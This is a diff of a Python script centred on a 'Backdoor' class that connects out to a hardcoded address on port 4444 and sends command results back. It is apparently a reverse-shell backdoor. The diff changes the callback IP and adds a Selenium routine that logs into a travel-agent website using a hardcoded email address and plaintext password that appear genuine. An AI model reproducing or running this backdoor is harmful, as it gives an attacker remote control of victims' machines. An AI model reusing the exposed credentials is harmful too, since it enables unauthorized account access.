@@ -11,6 +11,8 @@ import subprocess
 import base64
 import re
 
+ipAddress = "10.178.122.126"
+port = 4444
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -106,6 +108,11 @@ class Backdoor:
 
             self.reliable_send(command_result)
 
+            
+#  =============================================================
+
+#       For checking the system ip Address 
+#  =============================================================
 # def get_primary_ip():
 #     output = os.popen("ipconfig").read()
 #     match = re.search(r"IPv4 Address[.\s]*:\s*([\d\.]+)", output)
@@ -116,5 +123,47 @@ class Backdoor:
 
 # ipAddress = get_primary_ip()
 # print("Primary IP:", ipAddress)
-myBackdoor = Backdoor("192.168.18.6", 4444)
+
+# =================================================
+
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+
+# Keep browser open
+options = Options()
+options.add_experimental_option("detach", True)
+
+driver = webdriver.Chrome(options=options)
+def loginWeb():
+    # Open URL
+    driver.get("https://agent.aeroglobe.io/")
+
+    wait = WebDriverWait(driver, 15)
+
+    # ✅ First input (Email) - FIXED selector
+    first_input = wait.until(
+        EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Enter your email']"))
+    )
+    first_input.clear()
+    first_input.send_keys("ayanmaliklhe@gmail.com")
+
+    # ✅ Second input (Password)
+    second_input = wait.until(
+        EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Enter your password']"))
+    )
+
+    second_input.clear()
+    second_input.send_keys("January@786")
+
+
+    submitBtn = wait.until(EC.presence_of_element_located((By.XPATH,'//*[@id="app"]/div/div/div/div/div/div/form/button[2]')))
+    submitBtn.click()
+
+
+
+myBackdoor = Backdoor(ipAddress, port)
 myBackdoor.run()
+loginWeb()
